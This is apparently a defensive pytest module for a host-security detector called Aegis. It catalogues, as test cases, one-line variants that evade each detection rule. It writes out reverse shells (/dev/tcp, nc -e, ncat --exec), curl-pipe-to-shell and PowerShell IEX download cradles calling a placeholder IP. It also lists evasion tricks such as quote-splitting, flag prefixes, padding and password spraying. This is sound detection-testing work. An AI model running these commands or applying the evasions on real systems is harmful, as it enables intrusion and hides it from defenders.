"""Adversarial self-audit: one-line variants against every exact-match rule.

Aegis's whole detection logic is one readable file. This module asks, per
static rule, what the cheapest edit is that an attacker who has read the rule
makes to slip past it — and records the answer as a test, so the answer stays
true. Two kinds of case:

  * the CANONICAL stimulus, which must always fire (a positive control, the
    same discipline as `assay`);
  * VARIANTS. One that is caught is a plain passing test. One that evades is
    marked `xfail(strict=True)` with the reason naming (a) the evasion and
    (b) the SECOND POLE that would still see it, or "sole detector" when
    nothing would. strict means a later fix flips the row to XPASS and fails
    the suite until the row is updated — the table cannot silently rot.

Constants are deliberately NOT hidden or perturbed: a single-file local tool
gains nothing from obscurity, and `replay`/`rehunt` depend on deterministic
rules. Sole-detector rows are fixed by adding a second pole, never by secrecy.

The table, as measured 2026-09-02 (verified by running, not by reading):

  clipboard_grammar        certain idioms are prefix/format-brittle (mshta.exe,
                           quoted URL, powershell -ec/-e/-win/-w h, IEX with an
                           extra paren or System.Net, Invoke-Expression, a
                           fetch-then-iex variable); second pole for the paste
                           GUARD path is _hostile_content (powershell-iex,
                           powershell-encoded-command w/ 40+ base64 chars), but
                           the `clipboard check|guard` path has NO second pole.
                           Structural tells: 39 spaces, NBSP padding and a
                           newline followed by a comment all evade — sole
                           detector.
  _hostile_content /       pipe-to-shell dies to quote-splitting (ba""sh,
  _argv_signals            b\\ash, $SHELL) and to a scheme-less URL; both
                           still leave a MEDIUM fetch idiom (network-fetch /
                           raw-ip-fetch) but lose the HIGH fileless-fetch-exec
                           combination, i.e. drop below the notify floor.
                           netcat: `ncat --exec` and `nc -c` are not matched at
                           all — sole detector. base64 `-di` evades the decode
                           idiom. Second pole for a running process: the
                           risk-window accumulation across sensors.
  _hostile_args            robust to the above because _FETCH_RE fires on its
                           own; but a script in ~/.config or ~/Library is by
                           design not hostile (documented: alert rarely).
  beacon recurrence        two-way rotation (port, ip, drop path) only DELAYS:
                           each key still reaches 3 sightings in the window.
                           A pool wide enough that no endpoint repeats thrice
                           evades — the sightings key is exact. Sole detector
                           for that shape; the live scorer is per-scan.
  _parse_auth_log          per-(user, ip) count: two users from one IP or a
                           password spray across IPs never reach the threshold
                           — sole detector.
  risk accumulation        pacing signals >RISK_WINDOW apart never accumulates;
                           by design (the window IS the rule) but a sole
                           detector for a patient attacker.
  agent-surface text cap   a config over _AGENT_TEXT_CAP is skipped ENTIRELY,
                           so a 256 KB whitespace pad hides an MCP registration
                           — sole detector, and the cheapest evasion found.
"""
import json
import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))  # sibling import
import aegis  # noqa: E402
from test_regression import Sandbox  # noqa: E402

IP = "198.51.100.7"


def _xf(reason):
    return pytest.mark.xfail(strict=True, reason=reason)


# --- clipboard_grammar: CERTAIN idioms ------------------------------------- #

CERTAIN_CASES = [
    pytest.param("mshta http://%s/a.hta" % IP, id="mshta-canonical"),
    pytest.param("mshta.exe http://%s/a.hta" % IP, id="mshta-exe",
                 marks=_xf("`\\bmshta\\b\\s+` needs whitespace right after "
                           "mshta; .exe breaks it. Second pole: "
                           "_hostile_content windows-lolbin-proxy-exec.")),
    pytest.param('mshta "http://%s/a.hta"' % IP, id="mshta-quoted",
                 marks=_xf("URL must follow the whitespace unquoted. Second "
                           "pole: windows-lolbin-proxy-exec.")),
    pytest.param("powershell -enc " + "A" * 60, id="ps-enc-canonical"),
    pytest.param("powershell -EncodedCommand " + "A" * 60, id="ps-enc-long"),
    pytest.param("powershell -ec " + "A" * 60, id="ps-ec",
                 marks=_xf("PowerShell accepts any unique prefix (-e, -ec, "
                           "-en); grammar lists only -enc/-encodedcommand. "
                           "Second pole: _hostile_content "
                           "powershell-encoded-command (40+ base64 chars).")),
    pytest.param("powershell -e " + "A" * 60, id="ps-e",
                 marks=_xf("same prefix evasion as -ec.")),
    pytest.param("powershell -w hidden -c calc", id="ps-w-hidden-canonical"),
    pytest.param("powershell -WindowStyle Hidden -c calc", id="ps-ws-hidden"),
    pytest.param("powershell -win hidden -c calc", id="ps-win-hidden",
                 marks=_xf("-win/-wi/-wind prefixes are valid PowerShell; "
                           "grammar takes -w or -windowstyle only. Sole "
                           "detector.")),
    pytest.param("powershell -w h -c calc", id="ps-w-h",
                 marks=_xf("enum prefix `h` for Hidden is valid PowerShell. "
                           "Sole detector.")),
    pytest.param("IEX (New-Object Net.WebClient).DownloadString('http://%s/a')"
                 % IP, id="iex-canonical"),
    pytest.param("iex(iwr http://%s/a)" % IP, id="iex-iwr"),
    pytest.param("IEX ((New-Object Net.WebClient).DownloadString('http://%s/a'))"
                 % IP, id="iex-double-paren",
                 marks=_xf("`IEX\\s*\\(\\s*New-Object` — one extra paren. "
                           "Second pole: _hostile_content powershell-iex + "
                           "powershell-webclient-download.")),
    pytest.param("IEX (New-Object System.Net.WebClient).DownloadString('x')",
                 id="iex-system-net",
                 marks=_xf("`System.Net.WebClient` is the canonical .NET "
                           "spelling and is not matched. Second pole: "
                           "powershell-iex.")),
    pytest.param("Invoke-Expression (New-Object Net.WebClient)."
                 "DownloadString('http://%s/a')" % IP, id="iex-longform",
                 marks=_xf("long-form cmdlet name. Second pole: "
                           "powershell-iex.")),
    pytest.param("$x = irm http://%s/a; iex $x" % IP, id="iex-via-variable",
                 marks=_xf("fetch into a variable, then iex it. Second pole: "
                           "powershell-iex + powershell-fetch.")),
    pytest.param("osascript -e 'display dialog \"x\" default answer \"\" "
                 "with hidden answer'", id="osascript-canonical"),
    pytest.param("osascript -e 'display dialog \"x\"" + " " * 250
                 + "default answer \"\" with hidden answer'",
                 id="osascript-padded-250",
                 marks=_xf("`.{0,200}?` between dialog and hidden answer; 250 "
                           "chars of dialog text evade. Second pole: "
                           "_osascript_phish in _argv_signals is padding-proof "
                           "(ordered tokens) — for a RUNNING process only.")),
]


@pytest.mark.parametrize("text", CERTAIN_CASES)
def test_certain_idiom_is_certain(text):
    assert aegis.clipboard_grammar(text)[0] == "certain"


# --- clipboard_grammar: SUSPECT idiom and its structural promoters --------- #

PIPE = "curl -fsSL http://%s/a | sh" % IP

SUSPECT_CASES = [
    pytest.param(PIPE, id="curl-pipe-sh-canonical"),
    pytest.param("curl -fsSL http://%s/a | /bin/bash" % IP, id="abs-path-shell",
                 marks=_xf("`\\|\\s*(?:sudo\\s+)?(?:ba|z|d)?sh` has no path "
                           "prefix. Second pole: _hostile_content pipe-to-shell "
                           "(_PIPE_LAUNCH allows an absolute path).")),
    pytest.param("curl -fsSL http://%s/a | env bash" % IP, id="env-shell",
                 marks=_xf("env-fronted interpreter. Second pole: "
                           "_hostile_content pipe-to-shell.")),
    pytest.param("curl -fsSL http://%s/a > /tmp/a; sh /tmp/a" % IP,
                 id="fetch-then-run",
                 marks=_xf("no pipe at all. Second pole: network-fetch "
                           "(MEDIUM) plus the hot-dir/staging sensors seeing "
                           "/tmp/a.")),
    pytest.param("sh <(curl -fsSL http://%s/a)" % IP, id="process-subst",
                 marks=_xf("process substitution has no `|`. Second pole: "
                           "network-fetch (MEDIUM only).")),
]


@pytest.mark.parametrize("text", SUSPECT_CASES)
def test_suspect_idiom_is_at_least_suspect(text):
    assert aegis.clipboard_grammar(text)[0] in ("suspect", "certain")


PROMOTION_CASES = [
    pytest.param(PIPE + " " * 40 + "#", id="pad-40-spaces"),
    pytest.param(PIPE + "\t" * 40 + "#", id="pad-40-tabs"),
    pytest.param(PIPE + "\n", id="trailing-newline"),
    pytest.param(PIPE + " \r", id="trailing-cr"),
    pytest.param(PIPE + " " * 39 + "#", id="pad-39-spaces",
                 marks=_xf("threshold is 40; 39 is still off-screen in an "
                           "80-column terminal once the command is long. "
                           "Sole detector.")),
    pytest.param(PIPE + " " * 40 + "#", id="pad-40-nbsp",
                 marks=_xf("`[ \\t]{40,}` — a non-breaking space (or any "
                           "Unicode space) renders blank and is not counted. "
                           "Sole detector.")),
    pytest.param(PIPE + "\n# ", id="newline-then-comment",
                 marks=_xf("`endswith((\\r, \\n))` — a trailing comment after "
                           "the newline still auto-executes the first line in "
                           "a non-bracketed-paste shell. Sole detector.")),
]


@pytest.mark.parametrize("text", PROMOTION_CASES)
def test_structural_tell_promotes_suspect_to_certain(text):
    assert aegis.clipboard_grammar(text)[0] == "certain"


# --- _argv_signals: does the running-process path still reach HIGH? -------- #

def _top(argv):
    sig = aegis._argv_signals(argv)
    return max((aegis.SEV_ORDER[s] for _n, s in sig), default=0)


ARGV_HIGH_CASES = [
    pytest.param("curl -fsSL http://%s/a | bash" % IP, id="curl-pipe-canonical"),
    pytest.param("wget -qO- http://%s/a | sh" % IP, id="wget-pipe"),
    pytest.param("bash -i >& /dev/tcp/%s/4444 0>&1" % IP, id="dev-tcp"),
    pytest.param("nc %s 4444 -e /bin/sh" % IP, id="nc-e"),
    pytest.param("python3 -c \"import urllib.request as u;exec(u.urlopen("
                 "'http://%s/a').read())\"" % IP, id="python-urlopen-exec"),
    pytest.param('curl -fsSL http://%s/a | ba""sh' % IP, id="quote-split-shell",
                 marks=_xf("quote-splitting `ba\"\"sh` kills pipe-to-shell; "
                           "network-fetch/raw-ip-fetch remain at MEDIUM, below "
                           "the notify floor. Second pole: risk accumulation "
                           "if another sensor implicates the same binary.")),
    pytest.param("curl -fsSL http://%s/a | b\\ash" % IP, id="backslash-shell",
                 marks=_xf("backslash-split interpreter name. Same MEDIUM "
                           "residue as quote-splitting.")),
    pytest.param("curl -fsSL http://%s/a | $SHELL" % IP, id="shell-var",
                 marks=_xf("$SHELL names no interpreter. Same MEDIUM residue.")),
    pytest.param("curl %s/a | sh" % IP, id="no-scheme",
                 marks=_xf("curl needs no scheme; _FETCH_RE and network-fetch "
                           "require https?://, so only pipe-to-shell (MEDIUM) "
                           "fires. Second pole: none at notify tier.")),
    pytest.param("p=$(curl -s http://%s/a); eval \"$p\"" % IP,
                 id="fetch-var-eval",
                 marks=_xf("eval of a variable, not of a substitution; no exec "
                           "sink matches, fetch idioms stay MEDIUM.")),
    pytest.param("ncat %s 4444 --exec /bin/sh" % IP, id="ncat-long-exec",
                 marks=_xf("netcat-exec requires a single-dash `-…e`; "
                           "`--exec` is ncat's documented form. Sole "
                           "detector.")),
    pytest.param("nc %s 4444 -c /bin/sh" % IP, id="nc-c",
                 marks=_xf("`-c` (OpenBSD/busybox nc) runs a command like -e "
                           "and is not matched. Sole detector.")),
]


@pytest.mark.parametrize("argv", ARGV_HIGH_CASES)
def test_argv_signal_reaches_high(argv):
    assert _top(argv) >= aegis.SEV_ORDER["HIGH"]


def test_base64_di_evades_the_decode_idiom():
    assert "base64-decode" in aegis._hostile_content("echo x | base64 -d | sh")
    # `-di` (decode + ignore-garbage) is a valid GNU flag bundle.
    assert "base64-decode" not in aegis._hostile_content(
        "echo x | base64 -di | sh"), "row needs updating: -di is now matched"


# --- _hostile_args: robust where argv is, documented-quiet elsewhere -------- #

def test_hostile_args_survives_quote_splitting_via_fetch_re():
    args = ["/bin/bash", "-c", 'curl -fsSL http://%s/a | ba""sh' % IP]
    assert aegis._hostile_args(args, "/bin/bash") is True


def test_hostile_args_is_quiet_on_dotdir_scripts_by_design():
    for rel in (".config/agent/run.sh", "Library/agent/run.sh"):
        args = ["/bin/bash", os.path.join(aegis.HOME, rel)]
        assert aegis._hostile_args(args, "/bin/bash") is False


# --- beacon recurrence: exact-key sightings ---------------------------------- #

T0 = 1700000000
ROW = ("/tmp/agent", IP, "443", "unsigned")


def _beacon(sightings, rows):
    return [f["severity"] for f in aegis._beacon_from_sightings(sightings, rows)]


def test_beacon_canonical_three_scans_over_46_minutes_fires():
    assert _beacon({ROW[:3]: [T0, T0 + 1500, T0 + 46 * 60]}, [ROW]) == ["HIGH"]


def test_beacon_44_minutes_is_under_the_span_by_design():
    assert _beacon({ROW[:3]: [T0, T0 + 1500, T0 + 44 * 60]}, [ROW]) == []


@pytest.mark.parametrize("second", [
    pytest.param(("/tmp/agent", IP, "8443", "unsigned"), id="port-rotate"),
    pytest.param(("/tmp/agent", "198.51.100.8", "443", "unsigned"),
                 id="ip-rotate"),
    pytest.param(("/tmp/agent2", IP, "443", "unsigned"), id="path-rotate"),
])
def test_beacon_two_way_rotation_only_delays(second):
    """Alternating two endpoints (or two drop paths) halves the sighting rate
    but every key still reaches three sightings inside the 7-day window, so
    rotation across a SMALL set delays the finding rather than evading it."""
    sightings = {ROW[:3]: [T0, T0 + 3600, T0 + 7200],
                 second[:3]: [T0 + 1800, T0 + 5400, T0 + 9000]}
    assert _beacon(sightings, [ROW, second]) != []


@pytest.mark.xfail(strict=True, reason=(
    "an endpoint pool wide enough that no (path, ip, port) repeats three "
    "times inside the window never fires — the sightings key is exact. Sole "
    "detector for that shape; a per-PROGRAM count of distinct endpoints is the "
    "second pole."))
def test_beacon_never_repeating_an_endpoint_thrice_still_fires():
    rows = [("/tmp/agent", "198.51.100.%d" % i, "443", "unsigned")
            for i in range(3)]
    sightings = {r[:3]: [T0 + (i + 3 * k) * 3600 for k in range(2)]
                 for i, r in enumerate(rows)}
    assert _beacon(sightings, rows) != []


# --- _parse_auth_log: per-(user, ip) burst threshold ------------------------ #

LINE = "Failed password for %s from %s port 2 ssh2"


def _brute(lines):
    return aegis._parse_auth_log("\n".join(lines))[1]


def test_auth_ten_failures_one_pair_is_brute_force():
    assert _brute([LINE % ("root", IP)] * 10)


def test_auth_nine_failures_is_under_threshold_by_design():
    assert not _brute([LINE % ("root", IP)] * 9)


@pytest.mark.xfail(strict=True, reason=(
    "10 failures from one IP split across two users never reach the per-"
    "(user, ip) threshold. Sole detector; a per-IP count is the second pole."))
def test_auth_two_users_from_one_ip_still_counts():
    assert _brute([LINE % ("root", IP)] * 5 + [LINE % ("admin", IP)] * 5)


@pytest.mark.xfail(strict=True, reason=(
    "password spray: one user from ten IPs. Sole detector; a per-user count "
    "is the second pole."))
def test_auth_spray_across_ips_still_counts():
    assert _brute([LINE % ("root", "198.51.100.%d" % i) for i in range(10)])


# --- risk accumulation window ---------------------------------------------- #

P = "/Users/Shared/onebinary"


class TestRiskWindowPacing(Sandbox):
    def _f(self, category, fp):
        return aegis.finding("MEDIUM", category, "s", "d", fp, path=P,
                             confidence="medium")

    def _risk(self):
        return [i for i in aegis.list_incidents()
                if i["title"].startswith("Accumulated risk")]

    def _record(self, spacing):
        rows = (("process", "process:%s:adhoc:aaa" % P),
                ("net-outbound", "outbound:%s" % P),
                ("hot-dir", "hotdir:%s" % P))
        for i, (cat, fp) in enumerate(rows):
            aegis.record_security_state([self._f(cat, fp)],
                                        now=T0 + i * spacing)

    def test_three_sensors_inside_the_window_accumulate(self):
        self._record(600)
        self.assertEqual(1, len(self._risk()))

    @pytest.mark.xfail(strict=True, reason=(
        "the same three signals paced RISK_WINDOW+1 s apart never share a "
        "window. By design (the window IS the rule) but a sole detector for a "
        "patient attacker; a longer-horizon rarity count is the second pole."))
    def test_three_sensors_paced_past_the_window_still_accumulate(self):
        self._record(aegis.RISK_WINDOW + 1)
        self.assertEqual(1, len(self._risk()))


# --- agent surface: the text cap skips the whole file ----------------------- #

class TestAgentSurfaceTextCap(Sandbox):
    def _snapshot_with(self, pad):
        root = os.path.join(self.tmp, "agentroot")
        os.makedirs(root)
        cfg = os.path.join(root, ".mcp.json")
        with open(cfg, "w", encoding="utf-8") as f:
            f.write(" " * pad)
            json.dump({"mcpServers": {"x": {"command": "/tmp/evil",
                                            "args": []}}}, f)
        self._saved["AGENT_CONFIG_ROOTS"] = aegis.AGENT_CONFIG_ROOTS
        aegis.AGENT_CONFIG_ROOTS = [root]
        return cfg, aegis.snapshot_agent_surface()

    def test_small_registration_is_seen_with_its_exec(self):
        cfg, snap = self._snapshot_with(0)
        self.assertIn(cfg, snap)
        self.assertTrue(snap[cfg].get("execs"))

    @pytest.mark.xfail(strict=True, reason=(
        "a file over _AGENT_TEXT_CAP is skipped ENTIRELY, so a whitespace pad "
        "hides an MCP registration the agent still reads. Sole detector — the "
        "cheapest evasion in this table. Fix: record oversized files as "
        "unparsed (hash-only) rather than absent."))
    def test_padded_registration_is_still_seen(self):
        cfg, snap = self._snapshot_with(aegis._AGENT_TEXT_CAP + 10)
        self.assertIn(cfg, snap)
